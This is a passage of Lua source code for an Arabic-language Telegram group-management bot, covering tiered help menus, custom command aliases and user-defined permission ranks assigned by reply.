return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("⌯ عذرا ليس لديك صلاحية التحكم لهذا الامر .")..'&show_alert=true')
end
local Help = DevAIAN:get(WAAD..'AIAN:Help3')
local Text = [[
⌯︙اوامر المدراء ↫ ⤈
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
⌯︙فحص البوت
⌯︙ضع اسم + الاسم
⌯︙اضف • حذف ↫ رد
⌯︙ردود المدير
⌯︙حذف ردود المدير
⌯︙اضف • حذف ↫ رد متعدد
⌯︙حذف رد من متعدد
⌯︙الردود المتعدده
⌯︙حذف الردود المتعدده
⌯︙حذف قوائم المنع
⌯︙منع ↫ بالرد على ( ملصق • صوره • متحركه )
⌯︙حذف قائمه منع + ↫ ⤈
( الصور • المتحركات • الملصقات )
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
⌯︙تنزيل الكل
⌯︙رفع ادمن • تنزيل ادمن
⌯︙الادمنيه • حذف الادمنيه
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
⌯︙تثبيت
⌯︙الغاء التثبيت
⌯︙اعاده التثبيت
⌯︙الغاء تثبيت الكل
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
⌯︙تغير رد + اسم الرتبه + النص ↫ ⤈
⌯︙المطور • منشئ الاساسي
⌯︙المنشئ • المدير • الادمن
⌯︙المميز • المنظف • العضو
⌯︙حذف ردود الرتب
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
⌯︙تغيير الايدي ↫ لتغيير الكليشه
⌯︙تعيين الايدي ↫ لتعيين الكليشه
⌯︙حذف الايدي ↫ لحذف الكليشه
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
⌯︙تفعيل • تعطيل + الامر ↫ ⤈
⌯︙اطردني • الايدي بالصوره • الابراج
⌯︙معاني الاسماء • اوامر النسب • انطق
⌯︙الايدي • تحويل الصيغ • اوامر التحشيش
⌯︙ردود المدير • ردود المطور • التحقق
⌯︙ضافني • حساب العمر • الزخرفه • غنيلي
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
[🖥┇𝐒𝐎𝐔𝐑𝐂𝐄 𝐃𝐑𝐀𝐆𝐎𝐍 .](t.me/CXRCX)➤
]]
keyboard = {} 
keyboard.inline_keyboard = {{{text="• اوامر الادمنيه •",callback_data="/HelpList2:"..data.sender_user_id_},{text="• اوامر الحمايه •",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="• اوامر المنشئين •",callback_data="/HelpList4:"..data.sender_user_id_}},{{text="• اوامر الاعضاء •",callback_data="/HelpList6:"..data.sender_user_id_},{text="• اوامر المطورين •",callback_data="/HelpList5:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="• رجوع •",callback_data="/HelpList:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Help or Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("⌯ عذرا الامر ليس لك .")..'&show_alert=true')
end
end
if DataText and DataText:match('/HelpList4:(.*)') then
local S0FI = DataText:match('/HelpList4:(.*)')
if tonumber(S0FI) == tonumber(data.sender_user_id_) then
if not Admin(data) then
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("⌯ عذرا ليس لديك صلاحية التحكم لهذا الامر .")..'&show_alert=true')
end
local Help = DevAIAN:get(WAAD..'AIAN:Help4')
local Text = [[
⌯︙اوامر المنشئين ↫ ⤈
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
⌯︙تنزيل الكل
⌯︙الميديا • امسح
⌯︙تعين عدد الحذف
⌯︙ترتيب الاوامر
⌯︙اضف • حذف ↫ امر
⌯︙حذف الاوامر المضافه
⌯︙الاوامر المضافه
⌯︙اضف نقاط ↫ بالرد • بالايدي
⌯︙اضف رسائل ↫ بالرد • بالايدي
⌯︙رفع منظف • تنزيل منظف
⌯︙المنظفين • حذف المنظفين
⌯︙رفع مدير • تنزيل مدير
⌯︙المدراء • حذف المدراء
⌯︙تفعيل • تعطيل + الامر ↫ ⤈
⌯︙نزلني • امسح
⌯︙الحظر • الكتم
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
⌯︙اوامر المنشئين الاساسيين ↫ ⤈
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
⌯︙وضع لقب + اللقب
⌯︙تفعيل • تعطيل ↫ الرفع
⌯︙رفع منشئ • تنزيل منشئ
⌯︙المنشئين • حذف المنشئين
⌯︙رفع • تنزيل ↫ مشرف
⌯︙رفع بكل الصلاحيات
⌯︙حذف القوائم
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
⌯︙اوامر المالكين ↫ ⤈
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
⌯︙رفع • تنزيل ↫ منشئ اساسي
⌯︙حذف المنشئين الاساسيين 
⌯︙المنشئين الاساسيين 
⌯︙حذف جميع الرتب
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
[🖥┇𝐒𝐎𝐔𝐑𝐂𝐄 𝐃𝐑𝐀𝐆𝐎𝐍 .](t.me/CXRCX)➤
]]
keyboard = {} 
keyboard.inline_keyboard = {{{text="• اوامر الادمنيه •",callback_data="/HelpList2:"..data.sender_user_id_},{text="• اوامر الحمايه •",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="• اوامر المدراء •",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="• اوامر الاعضاء •",callback_data="/HelpList6:"..data.sender_user_id_},{text="• اوامر المطورين •",callback_data="/HelpList5:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="• رجوع •",callback_data="/HelpList:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Help or Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("⌯ عذرا الامر ليس لك .")..'&show_alert=true')
end
end
if DataText and DataText:match('/HelpList5:(.*)') then
local S0FI = DataText:match('/HelpList5:(.*)')
if tonumber(S0FI) == tonumber(data.sender_user_id_) then
if not Admin(data) then
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("⌯ عذرا ليس لديك صلاحية التحكم لهذا الامر .")..'&show_alert=true')
end
local Help = DevAIAN:get(WAAD..'AIAN:Help5')
local Text = [[
⌯︙اوامر المطورين ↫ ⤈
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
⌯︙الكروبات
⌯︙المطورين
⌯︙المشتركين
⌯︙الاحصائيات
⌯︙المجموعات
⌯︙اسم البوت + غادر
⌯︙اسم البوت + تعطيل
⌯︙كشف + -ايدي المجموعه
⌯︙رفع مالك • تنزيل مالك
⌯︙المالكين • حذف المالكين
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
⌯︙رفع • تنزيل ↫ مدير عام
⌯︙حذف • المدراء العامين 
⌯︙رفع • تنزيل ↫ ادمن عام
⌯︙حذف • الادمنيه العامين 
⌯︙رفع • تنزيل ↫ مميز عام
⌯︙حذف • المميزين عام 
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
⌯︙اوامر المطور الاساسي ↫ ⤈
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
⌯︙تحديث
⌯︙الملفات
⌯︙المتجر
⌯︙السيرفر
⌯︙روابط الكروبات
⌯︙تحديث السورس
⌯︙تنظيف الكروبات
⌯︙تنظيف المشتركين
⌯︙حذف جميع الملفات
⌯︙تعيين الايدي العام
⌯︙تغير المطور الاساسي
⌯︙حذف معلومات الترحيب
⌯︙تغير معلومات الترحيب
⌯︙غادر + -ايدي المجموعه
⌯︙تعيين عدد الاعضاء + العدد
⌯︙حظر عام • الغاء العام
⌯︙كتم عام • الغاء العام
⌯︙قائمه العام • حذف قائمه العام
⌯︙وضع • حذف ↫ اسم البوت
⌯︙اضف • حذف ↫ رد عام
⌯︙ردود المطور • حذف ردود المطور
⌯︙تعيين • حذف • جلب ↫ رد الخاص
⌯︙جلب نسخه الكروبات
⌯︙رفع النسخه + بالرد على الملف
⌯︙تعيين • حذف ↫ قناة الاشتراك
⌯︙جلب كليشه الاشتراك
⌯︙تغيير • حذف ↫ كليشه الاشتراك
⌯︙رفع • تنزيل ↫ مطور
⌯︙المطورين • حذف المطورين
⌯︙رفع • تنزيل ↫ مطور ثانوي
⌯︙الثانويين • حذف الثانويين
⌯︙تعيين • حذف ↫ كليشة الايدي
⌯︙اذاعه للكل بالتوجيه ↫ بالرد
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
⌯︙تفعيل ملف + اسم الملف
⌯︙تعطيل ملف + اسم الملف
⌯︙تفعيل • تعطيل + الامر ↫ ⤈
⌯︙الاذاعه • الاشتراك الاجباري
⌯︙ترحيب البوت • المغادره
⌯︙البوت الخدمي • التواصل
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
[🖥┇𝐒𝐎𝐔𝐑𝐂𝐄 𝐃𝐑𝐀𝐆𝐎𝐍 .](t.me/CXRCX)➤
]]
keyboard = {} 
keyboard.inline_keyboard = {{{text="• اوامر الادمنيه •",callback_data="/HelpList2:"..data.sender_user_id_},{text="• اوامر الحمايه •",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="• اوامر المنشئين •",callback_data="/HelpList4:"..data.sender_user_id_},{text="• اوامر المدراء •",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="• اوامر الاعضاء •",callback_data="/HelpList6:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="• رجوع •",callback_data="/HelpList:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Help or Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("⌯ عذرا الامر ليس لك .")..'&show_alert=true')
end
end
if DataText and DataText:match('/HelpList6:(.*)') then
local S0FI = DataText:match('/HelpList6:(.*)')
if tonumber(S0FI) == tonumber(data.sender_user_id_) then
local Help = DevAIAN:get(WAAD..'AIAN:Help6')
local Text = [[
⌯︙اوامر الاعضاء ↫ ⤈
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
⌯︙السورس • موقعي • رتبتي • معلوماتي 
⌯︙رقمي • لقبي • نبذتي • صلاحياتي • غنيلي
⌯︙رسائلي • حذف رسائلي • اسمي • معرفي 
⌯︙ايدي •ايديي • جهاتي • راسلني • الالعاب 
⌯︙نقاطي • بيع نقاطي • القوانين • زخرفه 
⌯︙رابط الحذف • نزلني • اطردني • المطور 
⌯︙منو ضافني • مشاهدات المنشور • الرابط 
⌯︙ايدي المجموعه • معلومات المجموعه 
⌯︙نسبه الحب • نسبه الكره • نسبه الغباء 
⌯︙نسبه الرجوله • نسبه الانوثه • التفاعل
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
⌯︙لقبه + بالرد
⌯︙كول + الكلمه
⌯︙زخرفه + اسمك
⌯︙برج + نوع البرج
⌯︙معنى اسم + الاسم
⌯︙بوسه • بوسها ↫ بالرد
⌯︙احسب + تاريخ ميلادك
⌯︙رفع مطي • تنزيل مطي • المطايه
⌯︙هينه • هينها ↫ بالرد • بالمعرف
⌯︙صيحه • صيحها ↫ بالرد • بالمعرف
⌯︙صلاحياته ↫ بالرد • بالمعرف • بالايدي
⌯︙ايدي • كشف  ↫ بالرد • بالمعرف • بالايدي
⌯︙تحويل + بالرد ↫ صوره • ملصق • صوت • بصمه
⌯︙انطق + الكلام تدعم جميع اللغات مع الترجمه للعربي
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
[🖥┇𝐒𝐎𝐔𝐑𝐂𝐄 𝐃𝐑𝐀𝐆𝐎𝐍 .](t.me/CXRCX)➤
]]
keyboard = {} 
keyboard.inline_keyboard = {{{text="• اوامر الادمنيه •",callback_data="/HelpList2:"..data.sender_user_id_},{text="• اوامر الحمايه •",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="• اوامر المنشئين •",callback_data="/HelpList4:"..data.sender_user_id_},{text="• اوامر المدراء •",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="• اوامر المطورين •",callback_data="/HelpList5:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="• رجوع •",callback_data="/HelpList:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Help or Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("⌯ عذرا الامر ليس لك .")..'&show_alert=true')
end
end
end
if (data.ID == "UpdateNewMessage") then
local msg = data.message_
text = msg.content_.text_ 
if text and DevAIAN:get(WAAD.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
local NewCmmd = DevAIAN:get(WAAD.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
if NewCmmd then
DevAIAN:del(WAAD.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
DevAIAN:del(WAAD.."Set:Cmd:Group:New"..msg.chat_id_)
DevAIAN:srem(WAAD.."List:Cmd:Group:New"..msg.chat_id_,text)
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙تم حذف الامر من المجموعه", 1, 'html')  
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙لايوجد امر بهذا الاسم", 1, 'html')
end
DevAIAN:del(WAAD.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
return false
end
if text and text:match('^'..(DevAIAN:get(WAAD..'AIAN:NameBot') or "دراكون")..' ') then
data.message_.content_.text_ = data.message_.content_.text_:gsub('^'..(DevAIAN:get(WAAD..'AIAN:NameBot') or "دراكون")..' ','')
end
if data.message_.content_.text_ then
local NewCmmd = DevAIAN:get(WAAD.."Set:Cmd:Group:New1"..msg.chat_id_..":"..data.message_.content_.text_)
if NewCmmd then
data.message_.content_.text_ = (NewCmmd or data.message_.content_.text_)
end
end
if text and DevAIAN:get(WAAD.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
DevAIAN:set(WAAD.."Set:Cmd:Group:New"..msg.chat_id_,text)
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙ارسل الامر الجديد", 1, 'html')
DevAIAN:del(WAAD.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
DevAIAN:set(WAAD.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_,"true1") 
return false
end
if text and DevAIAN:get(WAAD.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_) == "true1" then
local NewCmd = DevAIAN:get(WAAD.."Set:Cmd:Group:New"..msg.chat_id_)
DevAIAN:set(WAAD.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text,NewCmd)
DevAIAN:sadd(WAAD.."List:Cmd:Group:New"..msg.chat_id_,text)
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙تم حفظ الامر", 1, 'html')
DevAIAN:del(WAAD.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_)
return false
end
if Constructor(msg) then
if text == "الاوامر المضافه" and ChCheck(msg) then
local List = DevAIAN:smembers(WAAD.."List:Cmd:Group:New"..msg.chat_id_.."") 
t = "⌯︙قائمة الاوامر المضافه ↫ ⤈ \nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n"
for k,v in pairs(List) do
Cmds = DevAIAN:get(WAAD.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
if Cmds then 
t = t..k.."~ ("..v..") • {"..Cmds.."}\n"
else
t = t..k.."~ ("..v..") \n"
end
end
if #List == 0 then
t = "⌯︙لاتوجد اوامر مضافه في المجموعه"
end
Dev_AIAN(msg.chat_id_, msg.id_, 1, t, 1, 'html')
end
if text == "حذف الاوامر المضافه" or text == "حذف الاوامر" or text == "مسح الاوامر المضافه" and ChCheck(msg) then
local List = DevAIAN:smembers(WAAD.."List:Cmd:Group:New"..msg.chat_id_)
for k,v in pairs(List) do
DevAIAN:del(WAAD.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
DevAIAN:del(WAAD.."List:Cmd:Group:New"..msg.chat_id_)
end
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙تم حذف الاوامر المضافه في المجموعه", 1, 'html')
end
if text == "ترتيب الاوامر" and Constructor(msg) and ChCheck(msg) then
DevAIAN:set(WAAD.."Set:Cmd:Group:New1"..msg.chat_id_..":ا","ايدي")
DevAIAN:sadd(WAAD.."List:Cmd:Group:New"..msg.chat_id_,"ا")
DevAIAN:set(WAAD.."Set:Cmd:Group:New1"..msg.chat_id_..":م","رفع مميز")
DevAIAN:sadd(WAAD.."List:Cmd:Group:New"..msg.chat_id_,"م")
DevAIAN:set(WAAD.."Set:Cmd:Group:New1"..msg.chat_id_..":اد","رفع ادمن")
DevAIAN:sadd(WAAD.."List:Cmd:Group:New"..msg.chat_id_,"اد")
DevAIAN:set(WAAD.."Set:Cmd:Group:New1"..msg.chat_id_..":مد","رفع مدير")
DevAIAN:sadd(WAAD.."List:Cmd:Group:New"..msg.chat_id_,"مد")
DevAIAN:set(WAAD.."Set:Cmd:Group:New1"..msg.chat_id_..":من","رفع منشئ")
DevAIAN:sadd(WAAD.."List:Cmd:Group:New"..msg.chat_id_,"من")
DevAIAN:set(WAAD.."Set:Cmd:Group:New1"..msg.chat_id_..":اس","رفع منشئ اساسي")
DevAIAN:sadd(WAAD.."List:Cmd:Group:New"..msg.chat_id_,"اس")
DevAIAN:set(WAAD.."Set:Cmd:Group:New1"..msg.chat_id_..":تعط","تعطيل الايدي بالصوره")
DevAIAN:sadd(WAAD.."List:Cmd:Group:New"..msg.chat_id_,"تعط")
DevAIAN:set(WAAD.."Set:Cmd:Group:New1"..msg.chat_id_..":تفع","تفعيل الايدي بالصوره")
DevAIAN:sadd(WAAD.."List:Cmd:Group:New"..msg.chat_id_,"تفع")
DevAIAN:set(WAAD.."Set:Cmd:Group:New1"..msg.chat_id_..":تك","تنزيل الكل")
DevAIAN:sadd(WAAD.."List:Cmd:Group:New"..msg.chat_id_,"تك")
DevAIAN:set(WAAD.."Set:Cmd:Group:New1"..msg.chat_id_..":رد","اضف رد")
DevAIAN:sadd(WAAD.."List:Cmd:Group:New"..msg.chat_id_,"رد")
DevAIAN:set(WAAD.."Set:Cmd:Group:New1"..msg.chat_id_..":رس","مسح رسائلي")
DevAIAN:sadd(WAAD.."List:Cmd:Group:New"..msg.chat_id_,"رس")
DevAIAN:set(WAAD.."Set:Cmd:Group:New1"..msg.chat_id_..":سح","مسح سحكاتي")
DevAIAN:sadd(WAAD.."List:Cmd:Group:New"..msg.chat_id_,"سح")
DevAIAN:set(WAAD.."Set:Cmd:Group:New1"..msg.chat_id_..":تغ","تغير الايدي")
DevAIAN:sadd(WAAD.."List:Cmd:Group:New"..msg.chat_id_,"تغ")
local text = "⌯︙ تم ترتيب الاوامر بالشكل التالي :\nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n• ايدي ↫ ا\n• رفع مميز ↫ م\n• رفع ادمن ↫ اد\n• رفع مدير ↫ مد\n• رفع منشئ ↫ من\n• رفع منشئ اساسي ↫ اس\n• تفعيل الايدي بالصوره ↫ تفع\n• تعطيل الايدي بالصوره ↫ تعط\n• تنزيل الكل ↫ تك\n• اضف رد ↫ رد\n• مسح رسائلي ↫ رس\n• مسح سحكاتي ↫ سح\n• تغير الايدي ↫ تغ\nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ"
Dev_AIAN(msg.chat_id_, msg.id_, 1, text, 1, "md")
end
--     Source WAAD     --
if text == "اضف امر" or text == "اضافة امر" or text == "اضافه امر" and ChCheck(msg) then
DevAIAN:set(WAAD.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙ارسل الامر القديم", 1, 'html')
return false
end
if text == "حذف امر" or text == "مسح امر" and ChCheck(msg) then 
DevAIAN:set(WAAD.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙ارسل الامر الذي قمت باضافته يدويا", 1, 'html')
return false
end
end
--     Source WAAD     --
if text == "الصلاحيات" or text == "صلاحيات" and ChCheck(msg) then 
local List = DevAIAN:smembers(WAAD.."Coomds"..msg.chat_id_)
if #List == 0 then
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙لاتوجد صلاحيات مضافه", 1, 'html')
return false
end
t = "⌯︙قائمة الصلاحيات المضافه ↫ ⤈ \nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n"
for k,v in pairs(List) do
var = DevAIAN:get(WAAD.."Comd:New:rt:AIAN:"..v..msg.chat_id_)
if var then
t = t..k.."~ "..v.." • ("..var..")\n"
else
t = t..k.."~ "..v.."\n"
end
end
Dev_AIAN(msg.chat_id_, msg.id_, 1, t, 1, 'html')
end
if Admin(msg) then
if text == "حذف الصلاحيات" and ChCheck(msg) or text == "مسح الصلاحيات" and ChCheck(msg) then
local List = DevAIAN:smembers(WAAD.."Coomds"..msg.chat_id_)
for k,v in pairs(List) do
DevAIAN:del(WAAD.."Comd:New:rt:AIAN:"..v..msg.chat_id_)
DevAIAN:del(WAAD.."Coomds"..msg.chat_id_)
end
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙تم حذف الصلاحيات المضافه", 1, 'html')
end
end
if text and text:match("^اضف صلاحيه (.*)$") and ChCheck(msg) then 
ComdNew = text:match("^اضف صلاحيه (.*)$")
DevAIAN:set(WAAD.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_,ComdNew)  
DevAIAN:sadd(WAAD.."Coomds"..msg.chat_id_,ComdNew)  
DevAIAN:setex(WAAD.."Comd:New"..msg.chat_id_..msg.sender_user_id_,200,true)  
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙ارسل نوع الصلاحيه \n{ عضو • مميز  • ادمن  • مدير }\n⌯︙ارسل الغاء لالغاء الامر ", 1, 'html')
end
if text and text:match("^حذف صلاحيه (.*)$") and ChCheck(msg) or text and text:match("^مسح صلاحيه (.*)$") and ChCheck(msg) then 
ComdNew = text:match("^حذف صلاحيه (.*)$") or text:match("^مسح صلاحيه (.*)$")
DevAIAN:del(WAAD.."Comd:New:rt:AIAN:"..ComdNew..msg.chat_id_)
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙تم حذف الصلاحيه", 1, 'html')
end
if DevAIAN:get(WAAD.."Comd:New"..msg.chat_id_..msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙تم الغاء الامر", 1, 'html')
DevAIAN:del(WAAD.."Comd:New"..msg.chat_id_..msg.sender_user_id_) 
return false  
end 
if text == "مدير" then
if not Constructor(msg) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙تستطيع اضافة صلاحية ( عضو • مميز  • ادمن )\n⌯︙ارسال نوع الصلاحيه مره اخرى", 1, 'html')
return false
end
end
if text == "ادمن" then
if not Manager(msg) then 
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙تستطيع اضافة صلاحية ( عضو • مميز )\n⌯︙ارسال نوع الصلاحيه مره اخرى", 1, 'html')
return false
end
end
if text == "مميز" then
if not Admin(msg) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙تستطيع اضافة صلاحية ( عضو )\n⌯︙ارسال نوع الصلاحيه مره اخرى", 1, 'html')
return false
end
end
if text == "مدير" or text == "ادمن" or text == "مميز" or text == "عضو" then
local textn = DevAIAN:get(WAAD.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_)  
DevAIAN:set(WAAD.."Comd:New:rt:AIAN:"..textn..msg.chat_id_,text)
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙تم اضافة الصلاحيه", 1, 'html')
DevAIAN:del(WAAD.."Comd:New"..msg.chat_id_..msg.sender_user_id_) 
return false  
end 
end

if text and text:match("رفع (.*)") and tonumber(msg.reply_to_message_id_) > 0 then 
local DEV_SoOoFi = text:match("رفع (.*)")
if DevAIAN:sismember(WAAD.."Coomds"..msg.chat_id_,DEV_SoOoFi) then
function by_reply(extra, result, success)   
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local mrAIAN = DevAIAN:get(WAAD.."Comd:New:rt:AIAN:"..DEV_SoOoFi..msg.chat_id_)
if mrAIAN == "مميز" and VipMem(msg) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'CXRCX')..')'..' ❩\n⌯︙تم رفعه ❨ '..DEV_SoOoFi..' ❩ بنجاح', 1, 'md')
DevAIAN:set(WAAD.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_SoOoFi) 
DevAIAN:sadd(WAAD..'AIAN:VipMem:'..msg.chat_id_, result.sender_user_id_)
elseif mrAIAN == "ادمن" and Admin(msg) then 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'CXRCX')..')'..' ❩\n⌯︙تم رفعه ❨ '..DEV_SoOoFi..' ❩ بنجاح', 1, 'md')
DevAIAN:set(WAAD.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_SoOoFi)
DevAIAN:sadd(WAAD..'AIAN:Admins:'..msg.chat_id_, result.sender_user_id_)
elseif mrAIAN == "مدير" and Manager(msg) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'CXRCX')..')'..' ❩\n⌯︙تم رفعه ❨ '..DEV_SoOoFi..' ❩ بنجاح', 1, 'md')
DevAIAN:set(WAAD.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_SoOoFi)  
DevAIAN:sadd(WAAD..'AIAN:Managers:'..msg.chat_id_, result.sender_user_id_)
elseif mrAIAN == "عضو" then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'CXRCX')..')'..' ❩\n⌯︙تم رفعه ❨ '..DEV_SoOoFi..' ❩ بنجاح', 1, 'md')
end
end,nil)   
end   
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text and text:match("تنزيل (.*)") and tonumber(msg.reply_to_message_id_) > 0 then 
local DEV_SoOoFi = text:match("تنزيل (.*)")
if DevAIAN:sismember(WAAD.."Coomds"..msg.chat_id_,DEV_SoOoFi) then
function by_reply(extra, result, success)   
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local mrAIAN = DevAIAN:get(WAAD.."Comd:New:rt:AIAN:"..DEV_SoOoFi..msg.chat_id_)
if mrAIAN == "مميز" and VipMem(msg) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'CXRCX')..')'..' ❩\n⌯︙تم تنزيله ❨ '..DEV_SoOoFi..' ❩ بنجاح', 1, 'md')
DevAIAN:srem(WAAD..'AIAN:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevAIAN:del(WAAD.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mrAIAN == "ادمن" and Admin(msg) then 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'CXRCX')..')'..' ❩\n⌯︙تم تنزيله ❨ '..DEV_SoOoFi..' ❩ بنجاح', 1, 'md')
DevAIAN:srem(WAAD..'AIAN:Admins:'..msg.chat_id_, result.sender_user_id_)
DevAIAN:del(WAAD.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mrAIAN == "مدير" and Manager(msg) then
